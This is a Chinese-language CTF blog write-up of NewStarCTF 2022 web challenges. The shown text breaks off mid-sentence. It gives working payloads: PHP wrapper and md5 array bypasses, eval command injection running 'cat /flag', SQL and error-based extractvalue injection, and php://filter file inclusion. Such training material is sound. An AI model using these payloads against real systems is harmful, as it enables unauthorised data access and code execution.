<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="ctf, solution, note, blog">
    
    <meta name="author" content="Forestsetyou">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://forestsetyou.github.io/2022/10/18/security/ctf/newstarctf 2022/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="false">
<meta property="og:type" content="article">
<meta property="og:title" content="NewStarCTF 2022">
<meta property="og:url" content="http://forestsetyou.github.io/2022/10/18/Security/CTF/NewStarCTF%202022/index.html">
<meta property="og:site_name" content="Festu&#39;s Blog">
<meta property="og:description" content="false">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://picturebed-1310517892.cos.ap-shanghai.myqcloud.com/2023/Snipaste_2023-10-31_10-43-31.png">
<meta property="og:image" content="https://picturebed-1310517892.cos.ap-shanghai.myqcloud.com/2023/image-20231031104900799.png">
<meta property="article:published_time" content="2022-10-18T09:04:00.000Z">
<meta property="article:modified_time" content="2023-10-31T16:49:00.000Z">
<meta property="article:author" content="Forestsetyou">
<meta property="article:tag" content="ctf, solution, note, blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://picturebed-1310517892.cos.ap-shanghai.myqcloud.com/2023/Snipaste_2023-10-31_10-43-31.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
    <!--- Page Info-->
    
    <title>
        
            NewStarCTF 2022 -
        
        Festu&#39;s Blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
        <style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    
<script src="/js/libs/anime.min.js"></script>

    <h1 class="ml13">
        Festu&#39;s Blog
    </h1>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });


        anime.timeline({loop: true})
            .add({
                targets: '.ml13 .letter',
                translateY: [100,0],
                translateZ: 0,
                opacity: [0,1],
                easing: "easeOutExpo",
                duration: 1400,
                delay: (el, i) => 300 + 30 * i
            }).add({
            targets: '.ml13 .letter',
            translateY: [0,-100],
            opacity: [1,0],
            easing: "easeInExpo",
            duration: 1200,
            delay: (el, i) => 100 + 30 * i
        });

        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
        });

        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
        hidePreloaderAfterTimeout(5000);

        function hidePreloaderAfterTimeout(delay) {
            setTimeout(function () {
                var preloader = document.querySelector('.preloader');
                preloader.style.opacity = '0';
                setTimeout(function () {
                    preloader.style.display = 'none';
                }, 200);
            }, delay);
        }
    </script>
</div>
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    <!--- Font Part-->
    
    
    
    


    <script id="hexo-configurations">
    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.1.1"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">

    <div class="navbar-content ">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/hide_imgs/smiling_face.png">
                </a>
            
            <a class="logo-title" href="/">
                
                Festu&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories"
                                        >
                                    <i class="fa-regular fa-folder fa-fw"></i>
                                    CATEGORIES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags"
                                        >
                                    <i class="fa-regular fa-tags fa-fw"></i>
                                    TAGS
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories"
                        >
                            <span>
                                CATEGORIES
                            </span>
                            
                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags"
                        >
                            <span>
                                TAGS
                            </span>
                            
                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                
                
                <img src="/hide_imgs/post_thumbnail-1.png" alt="NewStarCTF 2022" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
                
                <div class="w-full flex items-center absolute bottom-0 justify-start">
                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">NewStarCTF 2022</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/hide_imgs/avatar.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2022-10-18 17:04</span>
        <span class="mobile">2022-10-18 17:04</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2023-11-01 00:49</span>
            <span class="mobile">2023-11-01 00:49</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Security/">Security</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/Security/CTF/">CTF</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h2 id="WEB-Week1"><a href="#WEB-Week1" class="headerlink" title="WEB-Week1"></a>WEB-Week1</h2><h3 id="我真的会谢"><a href="#我真的会谢" class="headerlink" title="我真的会谢"></a>我真的会谢</h3><p>提示：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag has three part, qsdz hid them in different files.</span><br><span class="line">By the way, these files are sensitive.</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--I used VIM to write this file, but some errors occurred midway.--&gt;</span><br></pre></td></tr></table></figure></div>

<p>三段flag藏在三个敏感文件中，有一个是VIM意外退出生成的 <code>.?.swp</code> 文件，由于是网页文件，猜测文件为：”.index.php.swp”。得到第二段flag为”0_e4sy_d0_y00”</p>
<p>备份敏感文件robots.txt中藏有第一段flag”flag{Th1s_Is_s00”，网页的常用文件<a href="http://www.zip中藏有第三段flag："u_th1nk_so?}">www.zip中藏有第三段flag：&quot;u_th1nk_so?}</a>“</p>
<p>本来想扫描的，看了<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46497491/article/details/126960995" >wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>就直接得到文件了</p>
<h3 id="NotPHP"><a href="#NotPHP" class="headerlink" title="NotPHP"></a>NotPHP</h3><p>一道php绕过，源码如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先需要GET方式传入data，通过file_get_contents(data)函数访问一个文件内容且该内容恰好为”Weilcome to CTF”。借助data伪协议可以将文件流替换为输入流，构造 <code>/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=</code> 其中”V2VsY29tZSB0byBDVEY&#x3D;”是”Welcome to CTF”的base64编码</p>
<p>接着需要构造key1和key2以满足两者的md5编码结果能通过”===“测试且key1和key2的值能通过”!==“测试，要求两者内容不同但md5相同实际上是要求一个md5碰撞，但还有更简单的方法，由于php的 <code>md5()</code> 函数无法处理数组，一律返回null，因此只需要传入数组即可通过”===“测试：<code>key1[]=1&amp;key2[]=2</code></p>
<p>接着来到第三层检测，<code>is_numberic()</code> 函数检测变量是否为数字或数字字符串，浮点型也可返回true；<code>intval()</code> 获取变量的整数值；因此需要用post方式传入num变量使得它不是一个数字的同时将其转化为数字又等于2077。payload：<code>num=2077a</code> 。转化为数字时取开头连续的数字为2077，判断类型时由于a的存在被判断为非数字字符串。（好像有点简单233）十六进制 <code>num=0x81D</code> 无法绕过是因为字符串”0x81D”被认为是数字字符串</p>
<p>然后可以传入cmd参数进行命令执行，但是前面连接了一个注释符，因此需要绕过，可以使用换行符 <code>%0a</code> 换行绕过：<code>cmd=%0asystem(&#39;cat /flag&#39;);</code> 即可得到flag。或者使用 <code>?&gt;</code> 的闭合也可以绕过：<code>cmd=?&gt;&lt;?php system(&#39;cat /flag&#39;);</code> (<code>eval()</code> 函数中”?&gt;”的神奇效果，好像是直接将其插入到php文件中一样)</p>
<p>因此最终的payload：<code>http://de68bddc-7ec1-4ca7-b9d8-0eb85578a5e4.node4.buuoj.cn:81/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&amp;key1[]=1&amp;key2[]=2&amp;cmd=?&gt;&lt;?php system(&#39;cat /flag&#39;);</code> +POST内容：<code>num=2077a</code></p>
<p>参考：[</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53142368/article/details/116594299" >PHP伪协议 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/djkl/p/16778392.html" >DjkL-WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>]</p>
<h3 id="Word-For-You"><a href="#Word-For-You" class="headerlink" title="Word-For-You"></a>Word-For-You</h3><p>一道简单的SQL注入，就是有点迷惑性，先试试是不是数字型：<code>1 or 1=1</code> ，回显无任何内容，且1 or 1&#x3D;1被原样作为用户名打了出来，看上去很奇怪。再尝试字符型： <code>1&#39;</code> 发现没有报错，且 <code>1&#39;</code> 也被原样打了出来，我起初以为它做了严格的防sql的防火墙，后来发现它只是把输出原样打到了屏幕上。</p>
<p>payload：<code>1&#39; or &#39;1</code> 即可将数据库中所有留言都显示出来，其中就有flag。实际上注入是有效的，但是由于回显只是简单的将搜索结果和输入内容输出，若注入语句查询不到任何东西则回显内容也是空的，有一定欺骗性，因此看起来像是无法注入。</p>
<h2 id="WEB-Week2"><a href="#WEB-Week2" class="headerlink" title="WEB-Week2"></a>WEB-Week2</h2><h3 id="Word-For-You-1"><a href="#Word-For-You-1" class="headerlink" title="Word-For-You"></a>Word-For-You</h3><p>由于调试信息回显了出来，因此是一道报错注入，本题查询成功时不再回显查询结果</p>
<p>先注入库名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>wfy<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>再注入表名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>wfy<span class="string">&#x27;),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>wfy_admin,wfy_comments,wfy_info<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>猜测在’wfy_comments’中，注入列名：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>wfy_comments<span class="string">&#x27;),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>id,text,<span class="keyword">user</span>,name,display<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>评论应该在text中，注入text列：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select text from wfy_comments limit 11,1),0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-&gt;&#x27;</span><span class="operator">~</span>flag&#123;Ju4t_m2ke_some_err0rs&#125;<span class="operator">~</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>由于评论不止一条，使用”limit 11,1”获取第十一条就是flag。也可以使用”group_concat()”函数将所有评论连接起来，但是由于报错回显的长度有限，并不能将所有内容输出，这时候还可以用”MID()”函数提取字符串部分的方式寻找并取得flag。</p>
<h3 id="Include-One"><a href="#Include-One" class="headerlink" title="Include One"></a>Include One</h3><p>题目源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//flag in `flag.php`</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Baby Hacker?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>随机数种子的破解工具：<a class="link"   target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/" >php mt_srand()碰撞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>先破解随机数，post传入 <code>guess=1202031004</code> ，下方的正则过滤了”base”与”..&#x2F;“，并要求必须出现”NewStar”，提示flag在”flag.php”中，由于flag存储在php文件中，直接读取可能会化为源码隐藏起来，因此读取时需要字符转化来绕过 <code>&lt;?php</code> ，使用php的filter协议中的 <code>string.rot13</code> 来绕过即可，payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/NewStar/read=string.rot13/resource=flag.php</span><br></pre></td></tr></table></figure></div>

<p> 这里用不上目录穿越，flag.php就在工作目录下，也不在”NewStar”中。最终读取到的flag形式：</p>
